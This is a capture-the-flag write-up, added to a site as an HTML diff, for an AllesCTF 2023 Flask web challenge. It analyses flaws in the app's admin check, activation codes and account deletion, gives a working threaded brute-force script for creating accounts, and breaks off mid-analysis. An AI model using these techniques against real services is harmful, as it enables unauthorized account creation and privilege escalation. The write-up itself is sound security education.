@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" href="/style/style.css"/>
+        <link rel="stylesheet" href="/style/code_style.css"/>
+        <title>AllesCTF 2023</title>
+    </head>
+    <body>
+        <article>
+            <h1>AllesCTF 2023</h1>
+<h2>Cybercrime Society Club Germany</h2>
+<p>A Python Flask web challenge, with the flag in the same directory as the app. </p>
+<p><img alt="screenshot of the home page of the challenge website with options to login and sign up" src="/assets/ctf/2023/alles/web_cybercrime/homepage.png" /></p>
+<p>Looking at the files, it stores user data in a json file, and judging by <code>admin.html</code>, it seems like there is an admin dashboard for privileged users.</p>
+<p><img alt="file structure of the challenge source code" src="/assets/ctf/2023/alles/web_cybercrime/challenge_file_structure.png" /></p>
+<h3>Users</h3>
+<p>The json store for users' data is controlled by the <code>UserDB</code> class in the <code>Userdb.py</code> file. It handles the logic for creating a new user, authentication, changing the email address, etc. For example, here is the admin authorisation method:</p>
+<p><code>Userdb.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">is_admin</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">email</span><span class="p">):</span>
+    <span class="n">user</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">email</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">False</span>
+
+    <span class="c1">#TODO check userid type etc</span>
+    <span class="k">return</span> <span class="n">user</span><span class="p">[</span><span class="s2">&quot;email&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;admin@cscg.de&quot;</span> <span class="ow">and</span> <span class="n">user</span><span class="p">[</span><span class="s2">&quot;userid&quot;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">90000000</span>
+</code></pre></div>
+
+<p>To pass this check, the user has to have the admin's email and the user id has to be greater than 90 million.</p>
+<h3>Admin dashboard</h3>
+<p>Speaking of the admin, the user database is initialized with the admin account, whose user id is set to <code>90,010,001</code>, and password to a random uuid (not bruteforceable).</p>
+<p><code>app.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="n">userdb</span> <span class="o">=</span> <span class="n">UserDB</span><span class="p">(</span><span class="s2">&quot;userdb.json&quot;</span><span class="p">)</span>
+<span class="n">userdb</span><span class="o">.</span><span class="n">add_user</span><span class="p">(</span><span class="s2">&quot;admin@cscg.de&quot;</span><span class="p">,</span> <span class="mi">9_001_0001</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">()))</span> 
+</code></pre></div>
+
+<p>The admin dashboard html file only contains a form...</p>
+<p><code>templates/admin.html</code></p>
+<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;/admin&quot;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;cmd&quot;</span><span class="p">&gt;</span>cmd:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;cmd&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;cmd&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;date&quot;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Submit&quot;</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>...the results of which are sent to an API endpoint.</p>
+<p><code>templates/admin.html</code></p>
+<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="c1">// [...]</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">handleSubmit</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">event</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">FormData</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">sendToApi</span><span class="p">({</span>
+<span class="w">            </span><span class="s2">&quot;action&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="s2">&quot;data&quot;</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="s2">&quot;cmd&quot;</span><span class="o">:</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">)</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">});</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="c1">// [...]</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>The API code is also located in <code>app.py</code>. It looks like it passes the form input to <code>suprocess.run()</code>, executing the command (<a href="https://docs.python.org/3/library/subprocess.html#subprocess.run">python docs</a>) and returns the output of the command to the admin dashboard. Looks like the solution might be a reverse shell.</p>
+<p><code>app.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">api_admin</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">user</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">error_msg</span><span class="p">(</span><span class="s2">&quot;Not logged in&quot;</span><span class="p">)</span>
+    <span class="n">is_admin</span> <span class="o">=</span> <span class="n">userdb</span><span class="o">.</span><span class="n">is_admin</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="s2">&quot;email&quot;</span><span class="p">])</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">is_admin</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">error_msg</span><span class="p">(</span><span class="s2">&quot;User is not Admin&quot;</span><span class="p">)</span>
+
+    <span class="n">cmd</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">][</span><span class="s2">&quot;cmd&quot;</span><span class="p">]</span>
+    <span class="c1"># currently only &quot;date&quot; is supported</span>
+    <span class="k">if</span> <span class="n">validate_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+        <span class="n">out</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">success_msg</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+
+    <span class="k">return</span> <span class="n">error_msg</span><span class="p">(</span><span class="s2">&quot;invalid command&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>However, the <code>validate_command</code> function quickly shows us we don't have many options for commands to pass. It won't be as easy as <code>cat flag.txt</code>. Let's think about that later, we first need to figure out if it's even possible to gain admin privileges, for which we probably need an account.</p>
+<p><code>app.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">validate_command</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span> <span class="ow">and</span> <span class="n">string</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&quot;date&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
+</code></pre></div>
+
+<h3>Creating an account</h3>
+<p>Creating an account wasn't an obvious task.</p>
+<p><img alt="screenshot of the sign up page with fields: email, password, group dropdown, user id, and activation code" src="/assets/ctf/2023/alles/web_cybercrime/signup.png" /></p>
+<p>When submitting user details, the provided activation code is checked, and the account is created only if the check passes.</p>
+<p><code>app.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">api_create_account</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">user</span><span class="p">):</span>
+    <span class="n">dt</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">]</span>
+    <span class="n">email</span> <span class="o">=</span> <span class="n">dt</span><span class="p">[</span><span class="s2">&quot;email&quot;</span><span class="p">]</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">dt</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">]</span>
+    <span class="n">groupid</span> <span class="o">=</span> <span class="n">dt</span><span class="p">[</span><span class="s2">&quot;groupid&quot;</span><span class="p">]</span>
+    <span class="n">userid</span><span class="o">=</span><span class="n">dt</span><span class="p">[</span><span class="s2">&quot;userid&quot;</span><span class="p">]</span>
+    <span class="n">activation</span> <span class="o">=</span> <span class="n">dt</span><span class="p">[</span><span class="s2">&quot;activation&quot;</span><span class="p">]</span>
+
+    <span class="k">if</span> <span class="n">email</span> <span class="o">==</span> <span class="s2">&quot;admin@cscg.de&quot;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">error_msg</span><span class="p">(</span><span class="s2">&quot;cant create admin&quot;</span><span class="p">)</span>
+
+    <span class="k">assert</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">groupid</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
+    <span class="k">assert</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">userid</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span>
+
+    <span class="n">userid</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="s2">&quot;1&quot;</span> <span class="o">+</span> <span class="n">groupid</span> <span class="o">+</span> <span class="n">userid</span><span class="p">)</span>
+    <span class="c1"># print(dt)</span>
+    <span class="c1"># print(userid)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">check_activation_code</span><span class="p">(</span><span class="n">activation</span><span class="p">):</span>  <span class="c1"># &lt;---- HERE</span>
+        <span class="k">return</span> <span class="n">error_msg</span><span class="p">(</span><span class="s2">&quot;Activation Code Wrong&quot;</span><span class="p">)</span>
+    <span class="c1"># print(&quot;activation passed&quot;)</span>
+
+
+    <span class="k">if</span> <span class="n">userdb</span><span class="o">.</span><span class="n">add_user</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">userid</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+        <span class="c1"># print(&quot;user created&quot;)</span>
+        <span class="k">return</span> <span class="n">success_msg</span><span class="p">(</span><span class="s2">&quot;User Created&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">error_msg</span><span class="p">(</span><span class="s2">&quot;User creation failed&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>The verification first waits for 20 seconds (to supposedly discourage bruteforcing) and then checks if the activation code provided contains a random 4-digit number.</p>
+<p><code>app.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">check_activation_code</span><span class="p">(</span><span class="n">activation_code</span><span class="p">):</span>
+    <span class="c1"># no bruteforce</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s2">&quot;</span><span class="si">{:0&gt;4}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10000</span><span class="p">))</span> <span class="ow">in</span> <span class="n">activation_code</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">True</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">False</span>
+</code></pre></div>
+
+<p>Fortunately, there is no limit on the length of the activation code we can provide in the form. Giving a long activation code made up of digits 0-9 increases the odds that a random 4-digit number will be contained in it. I thought about using a superpermutation (<a href="https://en.wikipedia.org/wiki/Superpermutation">Wikipedia</a> or <a href="https://www.gregegan.net/SCIENCE/Superpermutations/Superpermutations.html">Greg Eagan's article</a>) to ensure the check always passes. But the quick and dirty solution of using a long activation code and trying it a lot in 20 threads at a time worked well enough. Here's the script I used:</p>
+<p><code>exploit/make_account.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+
+<span class="n">base_url</span> <span class="o">=</span> <span class="s1">&#39;https://5ae393509ccec98005d31b00-1024-cybercrime-society-club-germany.challenge.master.camp.allesctf.net:31337&#39;</span>
+<span class="n">userid</span> <span class="o">=</span> <span class="s1">&#39;8476&#39;</span>
+<span class="n">groupid</span> <span class="o">=</span> <span class="s1">&#39;001&#39;</span>
+<span class="n">email</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;8476@abcde.com&#39;</span>
+
+
+<span class="k">def</span> <span class="nf">make_account</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">groupid</span><span class="p">,</span> <span class="n">userid</span><span class="p">):</span>
+    <span class="c1"># create a long activation code</span>
+    <span class="n">activation</span> <span class="o">=</span> <span class="s1">&#39;1234567890135791246801470258136959384950162738&#39;</span>
+    <span class="n">activation</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">reversed</span><span class="p">(</span><span class="n">activation</span><span class="p">))</span>
+
+    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/json_api&#39;</span>
+
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
+        <span class="s1">&#39;action&#39;</span><span class="p">:</span> <span class="s1">&#39;create_account&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="p">{</span>
+            <span class="s1">&#39;email&#39;</span><span class="p">:</span> <span class="n">email</span><span class="p">,</span>
+            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
+            <span class="s1">&#39;groupid&#39;</span><span class="p">:</span> <span class="n">groupid</span><span class="p">,</span>
+            <span class="s1">&#39;userid&#39;</span><span class="p">:</span> <span class="n">userid</span><span class="p">,</span>
+            <span class="s1">&#39;activation&#39;</span><span class="p">:</span> <span class="n">activation</span>
+        <span class="p">}</span>
+    <span class="p">})</span>
+
+    <span class="c1"># return None if and only if the account wasn&#39;t created</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+    <span class="k">if</span> <span class="s1">&#39;return&#39;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;Error&#39;</span><span class="p">:</span>
+            <span class="k">if</span> <span class="s1">&#39;message&#39;</span> <span class="ow">in</span> <span class="n">result</span> <span class="ow">and</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;Activation Code Wrong&quot;</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Unexpected error in response:&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="k">return</span> <span class="kc">None</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">result</span>
+    <span class="k">return</span> <span class="kc">None</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Making account with userid </span><span class="si">{</span><span class="n">userid</span><span class="si">}</span><span class="s1"> and email </span><span class="si">{</span><span class="n">email</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
+
+<span class="k">def</span> <span class="nf">attempt</span><span class="p">():</span>
+    <span class="c1"># try to create an account 10 times</span>
+    <span class="c1"># (each try takes 20 seconds)</span>
+    <span class="k">global</span> <span class="n">found</span>
+    <span class="k">for</span> <span class="n">try_number</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">found</span><span class="p">:</span>
+            <span class="k">return</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">make_account</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="s1">&#39;1234&#39;</span><span class="p">,</span> <span class="n">groupid</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">userid</span><span class="p">))</span>
+        <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>    
+            <span class="nb">print</span><span class="p">(</span><span class="n">try_number</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+
+<span class="c1"># run one attempt in each 20 threads</span>
+<span class="n">num_threads</span> <span class="o">=</span> <span class="mi">20</span>
+<span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="k">for</span> <span class="n">num_thread</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_threads</span><span class="p">):</span>
+    <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">attempt</span><span class="p">)</span>
+    <span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+    <span class="n">threads</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">thread</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">thread</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+    <span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">found</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Success!&#39;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Failure&#39;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>It took about a minute to create the account, the output of the program was:</p>
+<div class="codehilite"><pre><span></span><code>$ python3 make_account.py 
+Making account with userid 8476 and email 8476@abcde.com
+0000000000111111111122 2222222233*333333344
+Success!
+</code></pre></div>
+
+<p>I could then log in to an account with the email 8476@abcde.com and password 1234.</p>
+<p><img alt="screenshot of the login page with email and password filled in" src="/assets/ctf/2023/alles/web_cybercrime/log_in_as_user.png" /></p>
+<h3>We're in (not in the cool way yet)</h3>
+<p>Logging in, we're presented with the user home page.</p>
+<p><img alt="screenshot of the user home page with links to account settings and to log out" src="/assets/ctf/2023/alles/web_cybercrime/normal_user_home_page.png" /></p>
+<p>Here's the settings page:</p>
+<p><img alt="screenshot of the settings page with an interface to change the email address or delete the account" src="/assets/ctf/2023/alles/web_cybercrime/account_settings.png" /></p>
+<p>Now that we're here, let's take a look at what the API can do for us.</p>
+<p><code>app.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="n">actions</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;delete_account&quot;</span><span class="p">:</span> <span class="n">api_delete_account</span><span class="p">,</span>
+    <span class="s2">&quot;create_account&quot;</span><span class="p">:</span> <span class="n">api_create_account</span><span class="p">,</span>
+    <span class="s2">&quot;edit_account&quot;</span><span class="p">:</span> <span class="n">api_edit_account</span><span class="p">,</span>
+    <span class="s2">&quot;login&quot;</span><span class="p">:</span> <span class="n">api_login</span><span class="p">,</span>
+    <span class="s2">&quot;logout&quot;</span><span class="p">:</span> <span class="n">api_logout</span><span class="p">,</span>
+    <span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="n">api_error</span><span class="p">,</span>
+    <span class="s2">&quot;admin&quot;</span><span class="p">:</span> <span class="n">api_admin</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/json_api&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;POST&quot;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">json_api</span><span class="p">():</span>
+    <span class="n">user</span> <span class="o">=</span> <span class="n">get_user</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&quot;POST&quot;</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">get_data</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+        <span class="c1"># print(data)</span>
+        <span class="n">action</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;action&quot;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">action</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s2">&quot;missing action&quot;</span>
+
+        <span class="k">return</span> <span class="n">actions</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">api_error</span><span class="p">)(</span><span class="n">data</span><span class="p">,</span> <span class="n">user</span><span class="p">)</span>
+
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>
+</code></pre></div>
+
+<p>We already know the <code>create_account</code> and <code>admin</code> actions. The actions <code>login</code>, <code>logout</code>, and <code>error</code> don't offer anything interesting for our purpose. The remaining ones are:
+- <code>edit_account</code>
+- <code>delete_account</code></p>
+<h4><code>edit_account</code></h4>
+<p>The <code>edit_account</code> action is used by the form for changing the email address of the logged in account (screenshot above).</p>
+<p><code>app.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">api_edit_account</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">user</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">error_msg</span><span class="p">(</span><span class="s2">&quot;not logged in&quot;</span><span class="p">)</span>
+
+    <span class="n">new</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">][</span><span class="s2">&quot;email&quot;</span><span class="p">]</span>
+
+    <span class="k">if</span> <span class="n">userdb</span><span class="o">.</span><span class="n">change_user_mail</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="s2">&quot;email&quot;</span><span class="p">],</span> <span class="n">new</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">success_msg</span><span class="p">(</span><span class="s2">&quot;Success&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">error_msg</span><span class="p">(</span><span class="s2">&quot;Fail&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p><code>Userdb.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">change_user_mail</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">old</span><span class="p">,</span> <span class="n">new</span><span class="p">):</span>
+    <span class="n">user</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">old</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">new</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;account exists&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">False</span>
+
+    <span class="n">user</span><span class="p">[</span><span class="s2">&quot;email&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">new</span>
+    <span class="k">del</span> <span class="bp">self</span><span class="o">.</span><span class="n">db</span><span class="p">[</span><span class="n">old</span><span class="p">]</span>
+    <span class="bp">self</span><span class="o">.</span><span class="n">db</span><span class="p">[</span><span class="n">new</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span>
+    <span class="bp">self</span><span class="o">.</span><span class="n">save_db</span><span class="p">()</span>
+    <span class="k">return</span> <span class="kc">True</span>
+</code></pre></div>
+
+<p>The only checks in place are to see if the logged in user's email exists in the database and if the new email isn't already used by another user. Note that it doesn't prevent changing the user's email to the admin email. That is, if the admin's email, or entire user, doesn't exist in the database... Maybe we can delete the admin account?</p>
+<h4><code>delete_account</code></h4>
+<p><code>app.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">api_delete_account</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">user</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">error_msg</span><span class="p">(</span><span class="s2">&quot;not logged in&quot;</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">][</span><span class="s2">&quot;email&quot;</span><span class="p">]</span> <span class="o">!=</span> <span class="n">user</span><span class="p">[</span><span class="s2">&quot;email&quot;</span><span class="p">]:</span>
+        <span class="k">return</span> <span class="n">error_msg</span><span class="p">(</span><span class="s2">&quot;Hey thats not your email!&quot;</span><span class="p">)</span>
+
+    <span class="c1"># print(list(data[&quot;data&quot;].values()))</span>
+    <span class="k">if</span> <span class="n">delete_accs</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">values</span><span class="p">()):</span>
+        <span class="k">return</span> <span class="n">success_msg</span><span class="p">(</span><span class="s2">&quot;deleted account&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Here, the validation checks if the logged in user's email matches the email in the request. But then it passes all <code>data["data"].values()</code> for deletion. This means that the check happens only on <code>data["data"]["email"]</code>, so if we provide another key-value pair in the request in <code>data["data"]</code>, its value will be passed to <code>delete_accs(data["data"].values())</code> too.</p>
+<p><code>app.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">delete_accs</span><span class="p">(</span><span class="n">emails</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">email</span> <span class="ow">in</span> <span class="n">emails</span><span class="p">:</span>
+        <span class="n">userdb</span><span class="o">.</span><span class="n">delete_user</span><span class="p">(</span><span class="n">email</span><span class="p">)</span>
+    <span class="k">return</span> <span class="kc">True</span>
+</code></pre></div>
+
+<p><code>Userdb.py</code></p>
